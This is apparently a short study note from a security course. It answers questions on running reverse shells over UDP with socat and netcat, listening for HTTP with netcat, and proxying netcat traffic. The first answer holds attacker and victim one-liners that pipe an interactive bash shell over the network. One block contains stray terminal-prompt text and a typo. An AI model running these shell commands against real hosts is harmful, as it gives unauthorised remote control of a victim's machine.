# 
## Security Questions
1. explain how to run the same connection via udp
    **socat**
    Attacker ```socat file:`tty`,raw,echo=0 UDP-L:8080```
    Victim ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane udp:localhost:8080```
    **netcat**
    Attacker ```nc -l -v -p 8080 -u```
    Victim 
```python
    kfifo fifo                                                 INT ✘  4s  root@hlkali 
    nc.traditional -u localhost 8080 < fifo |
    {
    echo "Hi"
    bash
    } > fifo
```
2. is it possible to run a http end-point with netcat?
```nc -l -v -p 80```

3. is it possible to proxify netcat traffic? 
Netcat as Proxy: nc -l -p 1221 < fifo | tee /dev/tty | nc localhost 1220 | tee fifo

Netcat proxy option: [Netcat](https://nmap.org/ncat/guide/ncat-proxy.html)

```ncat --proxy <proxyhost>[:<proxyport>] --proxy-type  { http  |   socks4  |   socks5 } <host> [<port>]```
